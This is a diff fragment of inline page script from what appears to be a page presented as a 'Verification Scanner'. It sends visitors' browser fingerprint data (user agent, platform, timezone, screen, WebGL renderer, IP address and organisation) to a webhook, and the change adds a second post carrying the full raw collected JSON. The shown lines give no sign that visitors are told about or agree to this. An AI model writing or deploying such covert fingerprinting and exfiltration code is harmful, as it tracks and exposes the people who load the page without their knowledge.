@@ -150,28 +150,38 @@
         network
       };
 
-      // Send to webhook
-      await fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          username: "Verification Scanner",
-          content: "New verification result",
-          embeds: [{
-            title: "Scanned Environment",
-            color: 3447003,
-            fields: [
-              { name: "User Agent", value: basic.userAgent || "Unknown", inline: false },
-              { name: "Platform", value: basic.platform || "Unknown", inline: true },
-              { name: "Timezone", value: basic.timezone || "Unknown", inline: true },
-              { name: "Screen", value: `${screenInfo.width}x${screenInfo.height}`, inline: true },
-              { name: "Touch Support", value: `${touch.maxTouchPoints} points`, inline: true },
-              { name: "WebGL Renderer", value: webgl.renderer || "Unknown", inline: false },
-              { name: "IP Info", value: network.ip ? `${network.ip} (${network.org})` : "Unavailable", inline: false }
-            ]
-          }]
-        })
-      });
+      // Send summary embed
+await fetch(WEBHOOK_URL, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    username: "Verification Scanner",
+    content: "New verification result",
+    embeds: [{
+      title: "Scanned Environment",
+      color: 3447003,
+      fields: [
+        { name: "User Agent", value: basic.userAgent || "Unknown", inline: false },
+        { name: "Platform", value: basic.platform || "Unknown", inline: true },
+        { name: "Timezone", value: basic.timezone || "Unknown", inline: true },
+        { name: "Screen", value: `${screenInfo.width}x${screenInfo.height}`, inline: true },
+        { name: "Touch Support", value: `${touch.maxTouchPoints} points`, inline: true },
+        { name: "WebGL Renderer", value: webgl.renderer || "Unknown", inline: false },
+        { name: "IP Info", value: network.ip ? `${network.ip} (${network.org})` : "Unavailable", inline: false }
+      ]
+    }]
+  })
+});
+
+// Send full raw JSON as a second message
+await fetch(WEBHOOK_URL, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    username: "Verification Scanner",
+    content: "```json\n" + JSON.stringify(collected, null, 2) + "\n```"
+  })
+});
     }
   </script>
 
